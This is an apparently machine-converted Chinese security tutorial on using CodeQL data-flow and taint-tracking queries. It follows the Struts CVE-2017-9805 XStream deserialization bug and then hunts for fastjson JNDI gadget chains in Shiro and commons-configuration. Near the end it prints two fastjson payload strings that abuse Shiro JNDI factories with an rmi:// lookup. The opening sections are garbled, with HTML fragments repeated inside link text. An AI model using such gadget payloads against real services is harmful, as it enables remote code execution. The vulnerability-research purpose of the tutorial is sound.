<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [xz.aliyun.com](https://xz.aliyun.com/t/7789)

> 先知社区，先知安全技术社区

本文主要内容有：

*   如何查找函数调用
*   如何查找属性使用
*   如何进行数据流分析
*   寻找 fastjson jndi 反序列化链

Workshop 学习
-----------

这部分是学习这个 codeql 的 [workshop](https://github.com/githubsatelliteworkshops/codeql/blob/master/java.md) 的笔记。Struts 有个漏洞[](http://cve.mitre.org/cgi-bin/cvename.cgi?>CVE-2017-9805</a> ，是由于用户控制的输入直接传到了<code>XStream.fromXML</code>，造成了反序列化漏洞。这个 workshop 主要是分析如何利用 codeql 数据流分析功能找到这个洞。</p><p></p><p><code>Struts</code>有个 <code>contentypehandler</code> 的<code>interface</code> 里面有个方法是<code>toObject(Reader in, Object target)</code>, 这个方法是用来根据用户请求的<code>content-type</code>来进行处理请求。现在已知这个<code>in</code> 是由用户完全控制的，可以算是一个<code>source</code>，另外一个已知是<code>com.thoughtworks.xstream.fromXML</code> 存在反序列化问题，可以算是一个<code>sink</code>.</p><p></p><p>所以进行数据流分析可以是从<code>toObject</code>这个<code>Method</code>的<code>in</code> 这个<code>Parameter</code>，流到<code>fromXML</code>这个<code>MethodAccess</code>的<code>arguement</code></p><p></p><p>下面是<code>parameter</code> 和 <code>argument</code>的区别。简单的来说<code>parameter</code>是函数定义时候的变量，<code>argument</code>是调用时传进去的变量。</p><p></p><blockquote><p>A parameter is a variable in a method definition. When a method is called, the arguments are the data you pass into the method's parameters.</p>

<pre>public void MyMethod(string myParam) { }

...

string myArg1 = )

### [Method](http://cve.mitre.org/cgi-bin/cvename.cgi?>CVE-2017-9805</a> ，是由于用户控制的输入直接传到了<code>XStream.fromXML</code>，造成了反序列化漏洞。这个 workshop 主要是分析如何利用 codeql 数据流分析功能找到这个洞。</p><p></p><p><code>Struts</code>有个 <code>contentypehandler</code> 的<code>interface</code> 里面有个方法是<code>toObject(Reader in, Object target)</code>, 这个方法是用来根据用户请求的<code>content-type</code>来进行处理请求。现在已知这个<code>in</code> 是由用户完全控制的，可以算是一个<code>source</code>，另外一个已知是<code>com.thoughtworks.xstream.fromXML</code> 存在反序列化问题，可以算是一个<code>sink</code>.</p><p></p><p>所以进行数据流分析可以是从<code>toObject</code>这个<code>Method</code>的<code>in</code> 这个<code>Parameter</code>，流到<code>fromXML</code>这个<code>MethodAccess</code>的<code>arguement</code></p><p></p><p>下面是<code>parameter</code> 和 <code>argument</code>的区别。简单的来说<code>parameter</code>是函数定义时候的变量，<code>argument</code>是调用时传进去的变量。</p><p></p><blockquote><p>A parameter is a variable in a method definition. When a method is called, the arguments are the data you pass into the method's parameters.</p>

<pre>public void MyMethod(string myParam) { }

...

string myArg1 = )

#### [根据 Method name 查询](http://cve.mitre.org/cgi-bin/cvename.cgi?>CVE-2017-9805</a> ，是由于用户控制的输入直接传到了<code>XStream.fromXML</code>，造成了反序列化漏洞。这个 workshop 主要是分析如何利用 codeql 数据流分析功能找到这个洞。</p><p></p><p><code>Struts</code>有个 <code>contentypehandler</code> 的<code>interface</code> 里面有个方法是<code>toObject(Reader in, Object target)</code>, 这个方法是用来根据用户请求的<code>content-type</code>来进行处理请求。现在已知这个<code>in</code> 是由用户完全控制的，可以算是一个<code>source</code>，另外一个已知是<code>com.thoughtworks.xstream.fromXML</code> 存在反序列化问题，可以算是一个<code>sink</code>.</p><p></p><p>所以进行数据流分析可以是从<code>toObject</code>这个<code>Method</code>的<code>in</code> 这个<code>Parameter</code>，流到<code>fromXML</code>这个<code>MethodAccess</code>的<code>arguement</code></p><p></p><p>下面是<code>parameter</code> 和 <code>argument</code>的区别。简单的来说<code>parameter</code>是函数定义时候的变量，<code>argument</code>是调用时传进去的变量。</p><p></p><blockquote><p>A parameter is a variable in a method definition. When a method is called, the arguments are the data you pass into the method's parameters.</p>

<pre>public void MyMethod(string myParam) { }

...

string myArg1 = )

```
[import java

from Method method
where method.hasName("toObject")
select method](http://cve.mitre.org/cgi-bin/cvename.cgi?>CVE-2017-9805</a> ，是由于用户控制的输入直接传到了<code>XStream.fromXML</code>，造成了反序列化漏洞。这个 workshop 主要是分析如何利用 codeql 数据流分析功能找到这个洞。</p><p></p><p><code>Struts</code>有个 <code>contentypehandler</code> 的<code>interface</code> 里面有个方法是<code>toObject(Reader in, Object target)</code>, 这个方法是用来根据用户请求的<code>content-type</code>来进行处理请求。现在已知这个<code>in</code> 是由用户完全控制的，可以算是一个<code>source</code>，另外一个已知是<code>com.thoughtworks.xstream.fromXML</code> 存在反序列化问题，可以算是一个<code>sink</code>.</p><p></p><p>所以进行数据流分析可以是从<code>toObject</code>这个<code>Method</code>的<code>in</code> 这个<code>Parameter</code>，流到<code>fromXML</code>这个<code>MethodAccess</code>的<code>arguement</code></p><p></p><p>下面是<code>parameter</code> 和 <code>argument</code>的区别。简单的来说<code>parameter</code>是函数定义时候的变量，<code>argument</code>是调用时传进去的变量。</p><p></p><blockquote><p>A parameter is a variable in a method definition. When a method is called, the arguments are the data you pass into the method's parameters.</p>

<pre>public void MyMethod(string myParam) { }

...

string myArg1 = ) 
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20200519002457-1ceacfde-9924-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20200519002457-1ceacfde-9924-1.png)

把这个方法的`class` `name`也查出来

```
import java

from Method method
where method.hasName("toObject")
select method, method.getDeclaringType()


```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20200519002458-1d802124-9924-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20200519002458-1d802124-9924-1.png)

点击右侧的可以看到相应的代码片段。

[![](https://xzfile.aliyuncs.com/media/upload/picture/20200519002458-1dd32c0c-9924-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20200519002458-1dd32c0c-9924-1.png)

这里比较奇怪，为啥 8，9 会出现。

[![](https://xzfile.aliyuncs.com/media/upload/picture/20200519002500-1eed0ef0-9924-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20200519002500-1eed0ef0-9924-1.png)

查看代码可以发现这是一个匿名类。看到这里感觉 codeql 还是比较牛逼的。

#### 根据 Method name 和 class name 查询

比如我想查询`Xstream` 这个类的`fromXML` 方法。

> predicate [hasQualifiedName](https://help.semmle.com/qldoc/java/semmle/code/java/Type.qll/predicate.Type$RefType$hasQualifiedName.2.html)([string](https://help.semmle.com/qldoc/java/type.string.html) package, [string](https://help.semmle.com/qldoc/java/type.string.html) type)

```
import java

from Method method
where method.hasName("fromXML") and method.getDeclaringType().hasQualifiedName("com.thoughtworks.xstream", "XStream")
select method


```

#### 根据 Method name 和 interface name 查询

比如我想查询`ContentTypeHandler` 的所有子类`toObject`方法

```
import java

from Method method
where method.hasName("toObject") and method.getDeclaringType().getASupertype().hasQualifiedName("org.apache.struts2.rest.handler", "ContentTypeHandler")
select method


```

这样会比直接根据 method name 查少一个结果, 少的结果是`ContentTypeHanlder`他自己。

[![](https://xzfile.aliyuncs.com/media/upload/picture/20200519002500-1f1856d2-9924-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20200519002500-1f1856d2-9924-1.png)

可以用`getAnAncestor()`

> Gets a direct or indirect supertype of this type, including itself.
> 
> [RefType](https://help.semmle.com/qldoc/java/semmle/code/java/Type.qll/type.Type$RefType.html) [getAnAncestor](https://help.semmle.com/qldoc/java/semmle/code/java/Type.qll/predicate.Type$RefType$getAnAncestor.0.html)()

```
import java

from Method method
where method.hasName("toObject") and method.getDeclaringType().getAnAncestor().hasQualifiedName("org.apache.struts2.rest.handler", "ContentTypeHandler")
select method


```

也可以用`getDeclaringType()*` 类似的还有`getDeclaringType()+`

有个问题是，万一一个类实现了多个接口是不是也可以这么用？ 答案是是的

`getAxxxx`，如果有多个结果会以多行的形式按照一定的顺序显示出来。

比如`getAParamType`

[![](https://xzfile.aliyuncs.com/media/upload/picture/20200519002501-1f4dfe18-9924-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20200519002501-1f4dfe18-9924-1.png)

#### 获取 Method 的 parameter

> [getAParamType()](https://help.semmle.com/qldoc/java/semmle/code/java/Member.qll/predicate.Member$Callable$getAParamType.0.html) Gets the type of a formal parameter of this callable
> 
> [getAParameter()](https://help.semmle.com/qldoc/java/semmle/code/java/Member.qll/predicate.Member$Callable$getAParameter.0.html) Gets a formal parameter of this callable
> 
> [getNumberOfParameters()](https://help.semmle.com/qldoc/java/semmle/code/java/Member.qll/predicate.Member$Callable$getNumberOfParameters.0.html) Gets the number of formal parameters of this callable.
> 
> [getParameter(int n)](https://help.semmle.com/qldoc/java/semmle/code/java/Member.qll/predicate.Member$Callable$getParameter.1.html) Gets the formal parameter at the specified (zero-based) position.
> 
> [getParameterType(int n)](https://help.semmle.com/qldoc/java/semmle/code/java/Member.qll/predicate.Member$Callable$getParameterType.1.html) Gets the type of the formal parameter at the specified (zero-based) position

```
import java

from MethodAccess call, Method method
where method.hasName("toObject") and method.getDeclaringType().getAnAncestor().hasQualifiedName("org.apache.struts2.rest.handler", "ContentTypeHandler") and call.getMethod() = method
select method.getParameter(0)


```

### MethodAccess

一般是先查`method`，与`MethodAccess.getMethod()` 进行比较。

比如查`ContentTypeHandler` 的 `toObject()` 方法的调用。

```
import java

from MethodAccess call, Method method
where method.hasName("toObject") and method.getDeclaringType().getASupertype().hasQualifiedName("org.apache.struts2.rest.handler", "ContentTypeHandler") and call.getMethod() = method
select call


```

上面这种查询方式不行，只能查到`JsonLibHandler` 这样显式定义的。

[![](https://xzfile.aliyuncs.com/media/upload/picture/20200519002501-1f80d0e0-9924-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20200519002501-1f80d0e0-9924-1.png)

对于这种, 真正用的并没有查到

[![](https://xzfile.aliyuncs.com/media/upload/picture/20200519002502-201078e4-9924-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20200519002502-201078e4-9924-1.png)

怎么改进呢？  
也可以使用`getAnAncestor()` 或者`getASupertype()*`

```
import java

from MethodAccess call, Method method
where method.hasName("toObject") and method.getDeclaringType().getAnAncestor().hasQualifiedName("org.apache.struts2.rest.handler", "ContentTypeHandler") and call.getMethod() = method
select call


```

这种查询能够涵盖上面的两种情况

从上面可以看到`MethodAccess` 的查询依赖于`Method` 的查询。

#### 获取 MethodAccess 的 argument

> [getATypeArgument](https://help.semmle.com/qldoc/java/semmle/code/java/Expr.qll/predicate.Expr$MethodAccess$getATypeArgument.0.html) Gets a type argument supplied as part of this method access, if any.  
> [getAnArgument](https://help.semmle.com/qldoc/java/semmle/code/java/Expr.qll/predicate.Expr$MethodAccess$getAnArgument.0.html) Gets an argument supplied to the method that is invoked using this method access.  
> [getArgument(int n)](https://help.semmle.com/qldoc/java/semmle/code/java/Expr.qll/predicate.Expr$MethodAccess$getArgument.1.html) Gets the argument at the specified (zero-based) position in this method access.
> 
> [getTypeArgument(int n)](https://help.semmle.com/qldoc/java/semmle/code/java/Expr.qll/predicate.Expr$MethodAccess$getTypeArgument.1.html) Gets the type argument at the specified (zero-based) position in this method access, if any.

```
import java

from MethodAccess call, Method method
where method.hasName("toObject") and method.getDeclaringType().getAnAncestor().hasQualifiedName("org.apache.struts2.rest.handler", "ContentTypeHandler") and call.getMethod() = method
select call.getArgument(0)


```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20200519002503-208dd776-9924-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20200519002503-208dd776-9924-1.png)

### dataflow

从 source，到 sink 有没有一条路径。

也就是从 toObject 的 in parameter 到 fromXML 的 in argument 有没有一条路径。

数据流分析要继承`DataFlow::Configuration` 这个类，然后重载`isSource` 和`isSink` 方法

```
class MyConfig extends DataFlow::Configuration {
  MyConfig() { this = "Myconfig" }
  override predicate isSource(DataFlow::Node source) {
    ....
    )
  }

    override predicate isSink(DataFlow::Node sink) {
    ....
    )
  }
}

```

先介绍一下`exists` 的用法。

> #### `exists`
> 
> This quantifier has the following syntax:
> 
> ```
> exists(<variable declarations> | <formula>)
> 
> ```
> 
> You can also write `exists( | | )`. This is equivalent to `exists( | and )`.
> 
> This quantified formula introduces some new variables. It holds if there is at least one set of values that the variables could take to make the formula in the body true.
> 
> For example, `exists(int i | i instanceof OneTwoThree)` introduces a temporary variable of type `int` and holds if any value of that variable has type `OneTwoThree`.

说人话就是，`variable`满足`formula` 则返回 true 否则返回 false

Node 的 方法

> [asExpr](https://help.semmle.com/qldoc/java/semmle/code/java/dataflow/internal/DataFlowUtil.qll/predicate.DataFlowUtil$Node$asExpr.0.html) Gets the expression corresponding to this node, if any.  
> [asParameter](https://help.semmle.com/qldoc/java/semmle/code/java/dataflow/internal/DataFlowUtil.qll/predicate.DataFlowUtil$Node$asParameter.0.html) Gets the parameter corresponding to this node, if any.

完整的数据流分析代码如下

```
import java
import semmle.code.java.dataflow.DataFlow

class StrutsUnsafeDeserializationConfig extends DataFlow::Configuration {
  StrutsUnsafeDeserializationConfig() { this = "StrutsUnsafeDeserializationConfig" }
  override predicate isSource(DataFlow::Node source) {
    exists(Method method |
    method.hasName("toObject") and method.getDeclaringType().getAnAncestor().hasQualifiedName("org.apache.struts2.rest.handler", "ContentTypeHandler") and source.asParameter() = method.getParameter(0)
    )
  }

    override predicate isSink(DataFlow::Node sink) {
    exists(MethodAccess call, Method method |
      method.hasName("fromXML") and method.getDeclaringType().hasQualifiedName("com.thoughtworks.xstream", "XStream") and call.getMethod() = method and sink.asExpr() = call.getArgument(0)
    )
  }
}

from StrutsUnsafeDeserializationConfig config, DataFlow::Node source, DataFlow::Node sink
where config.hasFlow(source, sink)
select source, sink


```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20200519002503-20a64522-9924-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20200519002503-20a64522-9924-1.png)

[![](https://xzfile.aliyuncs.com/media/upload/picture/20200519002503-20cad310-9924-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20200519002503-20cad310-9924-1.png)

小试牛刀 - codeql 找 fastjson 反序列化链
------------------------------

为了与这位老哥 [https://xz.aliyun.com/t/7482 作个对比，这里我也选用了 `shrio`](https://xz.aliyun.com/t/7482%E4%BD%9C%E4%B8%AA%E5%AF%B9%E6%AF%94%EF%BC%8C%E8%BF%99%E9%87%8C%E6%88%91%E4%B9%9F%E9%80%89%E7%94%A8%E4%BA%86%60shrio%60) 和`common-configuration`

### shrio

`source` 主要是 `class`的所有`Field`, `sink` 就是`javax.naming` `Context` `interface` 的 `lookup` 方法，看 16 年 backhat 的那个 ppt 其实还有个`search`方法，但是这个不能直接注入 URL，所以在这里就不考虑了。大家如果还有其他`sink`欢迎联系一起交流。

第一版代码

```
import java
import semmle.code.java.dataflow.DataFlow
import semmle.code.java.dataflow.TaintTracking

class JNDIMethod extends Method{
    JNDIMethod(){
        this.getDeclaringType().getAnAncestor().hasQualifiedName("javax.naming", "Context") and
        this.hasName("lookup")
    }
}

class MyTaintTrackingConfiguration extends TaintTracking::Configuration {
  MyTaintTrackingConfiguration() { this = "MyTaintTrackingConfiguration" }

  override predicate isSource(DataFlow::Node source) {
    exists(FieldAccess fac|
    source.asExpr() = fac
    )
  }

  override predicate isSink(DataFlow::Node sink) {
    exists(MethodAccess call |
    call.getMethod() instanceof JNDIMethod and sink.asExpr() = call.getArgument(0)
    )
  }
}

from  MyTaintTrackingConfiguration config, DataFlow::Node source, DataFlow::Node sink
where config.hasFlow(source, sink)
select source, sink


```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20200519002503-21014828-9924-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20200519002503-21014828-9924-1.png)

能查出来，但是没有显示具体的 path，后来查看文档，应该是可以显示 path 的。

> Running path queries in VS Code
> -------------------------------
> 
> 1.  Open a path query in the editor.
> 2.  Right-click in the query window and select **CodeQL: Run Query**. (Alternatively, run the command from the Command Palette.)
> 3.  Once the query has finished running, you can see the results in the Results view as usual (under `alerts` in the dropdown menu). Each query result describes the flow of information between a source and a sink.
> 4.  Expand the result to see the individual steps that the data follows.
> 5.  Click each step to jump to it in the source code and investigate the problem further.
> 6.  To navigate the path from your keyboard, you can bind shortcuts to the **CodeQL: Show Previous Step on Path** and **CodeQL: Show Next Step on Path** commands.

后来根据 [https://github.com/github/codeql/blob/master/java/ql/src/Security/CWE/CWE-079/XSS.ql](https://github.com/github/codeql/blob/master/java/ql/src/Security/CWE/CWE-079/XSS.ql) 这个抄了一下。

```
import java
import semmle.code.java.dataflow.FlowSources
import semmle.code.java.dataflow.TaintTracking2
import DataFlow2::PathGraph

class JNDIMethod extends Method{
    JNDIMethod(){
        this.getDeclaringType().getAnAncestor().hasQualifiedName("javax.naming", "Context") and
        this.hasName("lookup")
    }
}

class MyTaintTrackingConfiguration extends TaintTracking2::Configuration {
  MyTaintTrackingConfiguration() { this = "MyTaintTrackingConfiguration" }

  override predicate isSource(DataFlow::Node source) {
    exists(FieldAccess fac|
    source.asExpr() = fac
    )
  }

  override predicate isSink(DataFlow::Node sink) {
    exists(MethodAccess call |
    call.getMethod() instanceof JNDIMethod and sink.asExpr() = call.getArgument(0)
    )
  }
}

from  MyTaintTrackingConfiguration config, DataFlow2::PathNode source, DataFlow2::PathNode sink
where config.hasFlowPath(source, sink)
select sink.getNode(), source, sink, source.getNode()


```

下拉菜单里面`nodes` 和 `edge` 但是没有他说的`alerts`。

后来查了~一下~ 几下，查到了这个 [https://help.semmle.com/lgtm-enterprise/user/help/writing-custom-queries.html](https://help.semmle.com/lgtm-enterprise/user/help/writing-custom-queries.html) 在注释里面加一个 metadata 就行了。（其实上面的 xss.ql 里面也写了，以为注释不用抄）

最终代码变成了这样。

```
/**
@kind path-problem
*/

import java
import semmle.code.java.dataflow.FlowSources
import semmle.code.java.dataflow.TaintTracking2
import DataFlow2::PathGraph

class JNDIMethod extends Method{
    JNDIMethod(){
        this.getDeclaringType().getAnAncestor().hasQualifiedName("javax.naming", "Context") and
        this.hasName("lookup")
    }
}

class MyTaintTrackingConfiguration extends TaintTracking2::Configuration {
  MyTaintTrackingConfiguration() { this = "MyTaintTrackingConfiguration" }

  override predicate isSource(DataFlow::Node source) {
    exists(FieldAccess fac|
    source.asExpr() = fac
    )
  }

  override predicate isSink(DataFlow::Node sink) {
    exists(MethodAccess call |
    call.getMethod() instanceof JNDIMethod and sink.asExpr() = call.getArgument(0)
    )
  }
}


from  MyTaintTrackingConfiguration config, DataFlow2::PathNode source, DataFlow2::PathNode sink
where config.hasFlowPath(source, sink)
select source.getNode(), source, sink, sink.getNode()


```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20200519002504-21432810-9924-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20200519002504-21432810-9924-1.png)

通过人工检查这些路径，第一个属于误报，第二个三属于不同的分支，可利用，第四也可利用。

第一个是属于误报

分析认为`org.apache.shiro.jndi.JndiLocator` 的`CONTAINER_PREFIX` `Field` 也会通过`convertJndiName` 的调用传播到`lookup` 那里

第二个和第三个属于同一个，分别 if，else 分支里

`org.apache.shiro.jndi.JndiObjectFactory`

```
String input = "{\"@type\":\"org.apache.shiro.jndi.JndiObjectFactory\", \"resourceName\":\"rmi://127.0.0.1:9050/exploit\"}";
Object obj = JSON.parseObject(input);


```

第四个

`org.apache.shiro.realm.jndi.JndiRealmFactory`

```
String input = "{\"@type\":\"org.apache.shiro.realm.jndi.JndiRealmFactory\", \"jndiNames\":\"rmi://127.0.0.1:9050/exploit\"}";
Object obj = JSON.parseObject(input);


```

可以看到成功的发起了 RMI 请求

[![](https://xzfile.aliyuncs.com/media/upload/picture/20200519002504-2161e674-9924-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20200519002504-2161e674-9924-1.png)

怎么减少误报呢？

`FieldAccess`要从一个`setXXX`或者`getXXX` 流到 `lookup`。

```
/**
@kind path-problem
*/

import java
import semmle.code.java.dataflow.FlowSources
import semmle.code.java.dataflow.TaintTracking2
import DataFlow2::PathGraph

class JNDIMethod extends Method{
    JNDIMethod(){
        this.getDeclaringType().getAnAncestor().hasQualifiedName("javax.naming", "Context") and
        this.hasName("lookup")
    }
}

class MyTaintTrackingConfiguration extends TaintTracking2::Configuration {
  MyTaintTrackingConfiguration() { this = "MyTaintTrackingConfiguration" }

  override predicate isSource(DataFlow::Node source) {
    exists(FieldAccess fac |
    (fac.getSite().getName().indexOf("get")=0 or fac.getSite().getName().indexOf("set")=0) and source.asExpr() = fac
    )
  }

  override predicate isSink(DataFlow::Node sink) {
    exists(MethodAccess call |
    call.getMethod() instanceof JNDIMethod and sink.asExpr() = call.getArgument(0)
    )
  }
}


from  MyTaintTrackingConfiguration config, DataFlow2::PathNode source, DataFlow2::PathNode sink
where config.hasFlowPath(source, sink)
select source.getNode(), source, sink, sink.getNode()


```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20200519002504-218df6a6-9924-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20200519002504-218df6a6-9924-1.png)

这样就会排除第一个误报。

### common-configuration

`common-configuration` 的结果如下

[![](https://xzfile.aliyuncs.com/media/upload/picture/20200519002505-21d2626e-9924-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20200519002505-21d2626e-9924-1.png)

从上面可以看到效果和那位老哥的基本差不多，而且直接给出了具体的数据流。

~附件我提供了我创建好的两个 database，供大家下载！~  
一个 30.8M 一个 29.9M ，我没能上传成功，我是从 github 直接下载的源码，然后使用 `codeql database create --language=java qldatabase` 让他自己 build 一会就好了。

参考链接
----

*   workshop [https://github.com/githubsatelliteworkshops/codeql/](https://github.com/githubsatelliteworkshops/codeql/)
*   Codeql java api 手册 [https://help.semmle.com/qldoc/java/index.html](https://help.semmle.com/qldoc/java/index.html)
*   QL 语法手册 [https://help.semmle.com/QL/ql-handbook/expressions.html](https://help.semmle.com/QL/ql-handbook/expressions.html)
*   [https://xz.aliyun.com/t/7482](https://xz.aliyun.com/t/7482)
*   [https://github.com/github/codeql](https://github.com/github/codeql)